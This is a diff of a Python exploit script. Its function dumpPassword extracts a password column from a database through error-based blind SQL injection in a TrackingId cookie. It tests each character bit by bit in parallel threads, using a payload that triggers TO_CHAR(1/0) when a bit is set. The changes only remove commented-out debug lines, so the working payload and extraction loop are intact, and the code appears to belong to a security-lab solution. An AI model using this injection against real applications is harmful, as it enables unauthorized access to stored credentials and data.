@@ -115,14 +115,10 @@ def dumpPassword(p1, p2, s, column_name, table_name, conditional_key, conditiona
     trackingIdCookie = cookies_init['TrackingId']
     password = ''
     for position in range(1,length_password+1):
-    #position = 1
-    #if (position == 1):
         p1.status("Dump position %d" %position)
         threads = []
         bits_array = []
         for bit in bits:
-        #bit = 1
-        #if(bit == 1):
             payload = "' || (SELECT CASE WHEN bitand(ascii(substr(%s,%d,1)),%d)=%d THEN TO_CHAR(1/0) ELSE '' END FROM %s where %s = %s) || ' -- -" %(column_name, position,bit, bit, table_name, conditional_key, conditional_value)  
             injection = trackingIdCookie + payload
             thread = threading.Thread(target=makeRequest, args=(s, url, injection, bits_array, bit))
@@ -133,7 +129,6 @@ def dumpPassword(p1, p2, s, column_name, table_name, conditional_key, conditiona
             thread.join() 
 
         character = setStringtoASCII(build_binaryStr(bits_array))
-        #print("character: %s in position: %d" %(character,position) )
         password += character
         p2.status(password)
     return password
